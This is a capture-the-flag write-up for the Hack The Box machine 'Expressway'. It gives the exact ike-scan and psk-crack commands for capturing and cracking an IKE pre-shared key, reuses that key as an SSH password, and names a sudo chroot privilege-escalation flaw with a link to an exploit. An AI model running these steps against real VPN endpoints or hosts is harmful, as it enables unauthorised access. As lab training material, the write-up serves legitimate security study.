# Hack The Box: Expressway - Comprehensive Notes

**Target IP:** 10.129.35.151

**Domain:** expressway.htb

## 1. Scanning & Enumeration

### Network Scanning (Nmap)

**Open Ports:**

- `22/tcp` - SSH (OpenSSH 10.0p2 Debian 8)
    
- `500/udp` - ISAKMP (IKEv1)
    

**Scan Results:**

```
nmap -p 22 -sCV 10.129.35.151 -Pn
# 22/tcp open  ssh     OpenSSH 10.0p2 Debian 8

nmap --script=ike-version -sUV -p 500 10.129.35.151
# 500/udp open  isakmp
# | ike-version: 
# |   attributes: 
# |     XAUTH
# |_    Dead Peer Detection v1.0
```

### IKE Enumeration (Port 500)

The presence of ISAKMP on port 500 suggests a VPN endpoint. We used `ike-scan` to identify the specific configuration.

- **Mode:** Aggressive Mode (or Main Mode) is enabled.
    
- **Findings:** We can capture the Pre-Shared Key (PSK) hash using Aggressive Mode.
    

```
ike-scan -M --aggressive --id=test 10.129.35.151
# Returns Aggressive Mode Handshake
# ID: ike@expressway.htb
# Auth: PSK
```

## 2. Exploitation (User Access)

### Capturing & Cracking the PSK

We targeted the specific ID discovered (`ike@expressway.htb`) to capture the handshake hash.

1. **Capture Hash:**
    
    ```
    ike-scan -M --aggressive --id=ike@expressway.htb -P psk.txt 10.129.35.151
    ```
    
    _Result:_ The handshake data (including the hash) is saved to `psk.txt` (or displayed in the output).
    
2. Crack Hash:
    
    We used psk-crack with the rockyou.txt wordlist to recover the plaintext key.
    
    ```
    psk-crack -d /usr/share/wordlists/rockyou.txt psk-clean.txt
    ```
    
    - **Cracked PSK:** `freakingrockstarontheroad`
        

### SSH Access

The cracked PSK was reused as the password for the system user `ike`.

- **User:** `ike`
    
- **Password:** `freakingrockstarontheroad`
    
- **Command:** `ssh ike@expressway.htb`
    
## 3. Privilege Escalation (Root)

### Internal Enumeration

After gaining user access, checking the installed version of `sudo` revealed a vulnerability.

- **Command:** `/usr/local/bin/sudo --version`
    
- **Version:** `1.9.17`
    

### Vulnerability: CVE-2025-32463 ("Chwoot")

This version of Sudo is vulnerable to **CVE-2025-32463**, also known as "Chwoot".

- **Description:** The vulnerability exploits `sudo` when it allows running `chroot`. If a user has `sudo` privileges to run `chroot` (or if SUID binaries are misconfigured in a way that interacts with this), it can be abused to escape the restricted environment and gain full root access.
    
- **Reference:** [GitHub - CVE-2025-32463_chwoot](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot "null")
    

### Exploit Execution

Leveraging the exploit for CVE-2025-32463 allowed for escalation from the `ike` user directly to `root`.

**Status:** Machine Completed.